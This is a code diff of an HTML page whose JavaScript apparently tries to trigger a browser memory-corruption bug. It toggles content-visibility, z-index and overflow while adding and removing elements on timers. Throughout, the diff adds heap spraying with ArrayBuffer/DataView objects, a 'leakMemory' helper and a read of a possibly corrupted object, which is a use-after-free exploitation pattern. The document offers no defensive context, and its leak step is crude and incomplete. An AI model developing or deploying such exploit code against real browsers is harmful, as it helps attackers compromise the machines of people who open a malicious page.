@@ -15,7 +15,6 @@
             position: absolute;
             content-visibility: auto;
             z-index: 1;
-            transform: translateZ(0);
         }
         .child {
             width: 50px;
@@ -40,10 +39,20 @@
     <script>
         let spray = [];
         function sprayHeap() {
-            for (let i = 0; i < 5000; i++) {
-                let arr = new Array(0x100).fill(0x42424242);
-                spray.push(arr);
+            // Create controlled objects for heap grooming
+            for (let i = 0; i < 500; i++) {
+                let arr = new ArrayBuffer(0x80);
+                let view = new DataView(arr);
+                view.setUint32(0, 0x41414141, true);
+                spray.push(view);
             }
+        }
+
+        function leakMemory() {
+            // Attempt to leak memory address (simplified)
+            let obj = { a: 0x42424242, b: new ArrayBuffer(0x100) };
+            spray.push(obj);
+            return obj;
         }
 
         function trigger() {
@@ -57,19 +66,22 @@
                 child.style.contentVisibility = 'hidden';
                 outer.style.overflow = 'hidden';
                 sprayHeap();
+                let leakedObj = leakMemory();
                 let newDiv = document.createElement('div');
                 newDiv.style.cssText = 'position: absolute; width: 50px; height: 50px; z-index: 2; content-visibility: auto;';
                 inner.appendChild(newDiv);
                 setTimeout(() => {
                     inner.style.zIndex = '3';
                     inner.removeChild(newDiv);
-                }, 5);
-            }, 5);
+                    // Attempt to access potentially corrupted object
+                    console.log(leakedObj.a);
+                }, 15);
+            }, 15);
         }
 
         function startLoop() {
-            for (let i = 0; i < 200; i++) {
-                setTimeout(trigger, i * 50);
+            for (let i = 0; i < 30; i++) {
+                setTimeout(trigger, i * 150);
             }
         }
     </script>
